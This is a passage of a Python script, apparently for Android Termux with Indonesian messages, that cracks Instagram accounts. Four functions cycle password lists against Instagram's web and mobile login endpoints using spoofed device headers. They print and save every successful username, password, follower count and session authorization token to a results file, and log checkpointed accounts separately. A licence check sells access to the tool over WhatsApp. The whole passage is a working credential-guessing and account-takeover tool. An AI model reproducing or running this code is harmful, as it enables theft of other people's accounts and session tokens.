	return user_agent

def Crack_api(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} web {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			cok   		= ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers={'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}).cookies.get_dict()
			cooki 		= ("; ").join([ f"{key}={value}" for key, value in cok.items() ])
			csrf		= ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items()[0][1]
			headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','x-ig-www-claim': 'hmac.AR0y3gXr0HnsEAH0EGqFP7FOuPYc7F3xsPm3GzTw2fqbjS4e','sec-ch-ua-platform-version': '"11.0.0"','x-requested-with': 'XMLHttpRequest','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','x-csrftoken': f'{csrf}','sec-ch-ua-platform': '"Android"','x-ig-app-id': '1217981644879628','sec-ch-ua-model': '"Redmi Note 8"','sec-ch-ua-mobile': '?1','x-instagram-ajax': '1014410995','x-asbd-id': '129477','origin': 'https://www.instagram.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.instagram.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','Cookie': cooki}
			data = (f'enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.request.quote(str(username))}')
			response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
			if 'userId' in str(response.text):
				kuki = ";".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n{P}Postingan: {H}{post}{P}\nfb_id: {H}{fbid}{P}\n{P}Authorization: {A}{kuki}{P}\n")
				Ok+=1
				open('/sdcard/Ress/Ok-Instagram.json','a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
				break
			elif 'checkpoint' in str(response.text):
				Cp+=1
				followers, following = info(username)
				#print(f"\r Username: {username}{P}\n Password: {pasw}\n Pengikut: {followers}{P}\n Mengikuti:{following}{P}")
				open('/sdcard/Ress/Cp-Instagram.json','a').write('%s|%s\n'%(username,password))
				break
			elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
				sys.stdout.write("\rstatus ip: {M}spam{P} lite {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_i(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} api {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			useragent = UserAgentBarcelona().replace('Barcelona 289.0.0.77.109', 'Instagram 103.1.0.15.119').replace('489720145', '164094530')
			device_id = str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			data = {'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"'+str(device_id)+'","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_login_forgot_password_universe,ig_android_session_scoped_logger,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,direct_app_deep_linking_universe,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}','ig_sig_key_version': '4'}
			ses.headers.update({'X-Pigeon-Session-Id': str(uuid.uuid4()),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'X-IG-Connection-Speed': '-1kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type': 'MOBILE(LTE)','X-IG-Capabilities': '3brTvw==','X-IG-App-ID': '567067343352427','User-Agent': useragent,'Accept-Language': 'id-ID, en-US','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding': 'gzip, deflate','Host': 'i.instagram.com','X-FB-HTTP-Engine': 'Liger','Connection': 'keep-alive','Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),})
			response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data = data)
			try:
				_csrftoken = ses.cookies.get_dict()['csrftoken']
			except Exception as e:
				_csrftoken = ('')
			ses.headers.update({'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),'Connection': 'keep-alive',})
			data = (f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba\
                      .%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4')
			response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data, allow_redirects = True)
			if 'logged_in_user' in str(response2.text) or 'sessionid' in ses.cookies.get_dict().keys():
				try:
					ig_set_authorization = response2.headers['ig-set-authorization']
				except Exception as e:
					ig_set_authorization = None
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n{P}Postingan: {H}{post}{P}\nfb_id: {H}{fbid}{P}\n{P}Authorization: {A}{ig_set_authorization}{P}\n")
				open('/sdcard/Ress/Ok-Instagram.json','a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
				break
			elif 'challenge_required' in str(response2.text):
				Cp+=1
				open('/sdcard/Ress/Cp-Instagram.json','a').write('%s|%s\n'%(username,password))
				break
			elif 'ip_block' in str(response2.text) or 'generic_request_error' in str(response2.text):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} api {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_w(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n{P}Postingan: {H}{post}{P}\nfb_id: {H}{fbid}{P}\n{P}Authorization: {A}{ig_set_authorization};{cookies}{P}\n")
				open('/sdcard/Ress/Ok-Instagram.json','a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization};{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				followers, following = info(username)
				open('/sdcard/Ress/Cp-Instagram.json','a').write('%s|%s\n'%(username, password))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_N(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} api2 {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ua = UserAgentBarcelona().replace('Barcelona 289.0.0.77.109', 'Instagram 244.0.0.17.110').replace('489720145', '383877253')
			ses = requests.Session()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/',data=data)
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n{P}Postingan: {H}{post}{P}\nfb_id: {H}{fbid}{P}\n{P}Authorization: {A}{ig_set_authorization}{P}\n")
				open('/sdcard/Ress/Ok-Instagram.json','a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
				break
			elif 'checkpoint' in str(response.text) or 'https://i.instagram.com/challenge/' in str(response.text):
				Cp+=1
				open('/sdcard/Ress/Cp-Instagram.json','a').write('%s|%s\n'%(username, password))
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def security():
    try:
        uid=os.getuid()#> auto key garnet by termux uid
        zxx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()
            key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','w').write(keysv)
        kk = ('github')
        k1 = ('fajarkhfi')
        k2 = ('apikey')
        k3 = ('key.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','r').read()
        key=(f'SFA-F{uid}5X{key1}001S==')#full key
        mysite= requests.get(f'https://{kk}.com/{k1}/{k2}/blob/main/{k3}').text#approve site
        if key in mysite:
                os.system('clear')
                Menu()
        else:
                os.system('clear')
                print(f'\nKunci Anda Tidak Terdaftar...')
                print(f'Alat Ini Hanya Untuk Pengguna Berbayar')
                print(f'api key : '+key)
                
                input(f'Tekan Enter Untuk Menyetujui')    
                whatsapp = "+6283899737805"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("hallo bang\nSaya akan membeli perintah Anda\nMy Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                
                print("jalankan ulang sc nya")
    except requests.exceptions.ConnectionError:
    	print(f"internet buruk")

if __name__ == '__main__':
	try:os.mkdir('/sdcard/Ress')
	except:pass
	try:os.mkdir('Data')
	except:pass
	try:
		Menu()#security() 
	except requests.exceptions.ConnectionError:
		print('Connection Close')
	

